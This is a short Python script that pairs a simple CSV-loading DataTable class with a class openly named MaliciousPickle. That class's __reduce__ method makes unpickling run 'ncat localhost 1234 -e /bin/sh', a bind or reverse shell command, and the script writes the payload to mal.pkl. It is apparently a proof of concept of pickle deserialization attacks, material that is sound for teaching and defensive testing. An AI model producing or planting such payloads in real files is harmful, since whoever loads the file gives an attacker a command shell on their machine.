import pickle as pkl
from csv import reader

class DataTable:
    def __init__(self):
        self.num_rows = 0
        self.num_cols = 0
        self.header = None
        self.data = None 
    
    def load_data_from_csv(self, file):
        with open(file, 'r') as f:
            csv_reader = reader(f)
            parsed_csv = list(csv_reader)
            self.name = parsed_csv[0][0]
            self.headers = list(zip(parsed_csv[1], parsed_csv[2]))
            self.data = parsed_csv[3:]

class MaliciousPickle:
    def __reduce__(self):
        import os
        cmd = 'ncat localhost 1234 -e /bin/sh'
        return os.system, (cmd, )


x = MaliciousPickle()
with open("mal.pkl", "wb") as f:
    pkl.dump(x, f)